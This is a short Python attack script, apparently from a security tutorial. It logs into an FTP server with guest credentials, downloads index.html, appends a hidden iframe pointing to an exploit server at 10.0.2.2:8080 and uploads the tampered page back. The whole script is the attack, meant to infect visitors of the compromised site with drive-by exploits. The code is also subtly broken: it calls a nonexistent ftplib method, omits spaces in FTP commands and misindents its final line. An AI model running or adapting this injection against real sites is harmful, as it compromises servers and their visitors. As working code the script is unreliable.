import ftplib

def injectPage(ftp,page,redirect):
    f = open(page + 'tmp', 'w')
    ftp.readlines('RETR' + page,f.write)

    print('[+] Downloaded Page: ' + page)

    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)

    ftp.storlines('STOR' + page, open(page + 'tmp'))
    print('[+] Uploaded Injected Page' + page)

host = '10.0.2.17'
userName = 'guest'
passWord = 'guest'

ftp = ftplib.FTP(host)
ftp.login(userName, passWord)


redirect = '<iframe src =' +\
    '"http://10.0.2.2:8080/expliot"></iframe>'
    injectPage(ftp,'index.html', redirect)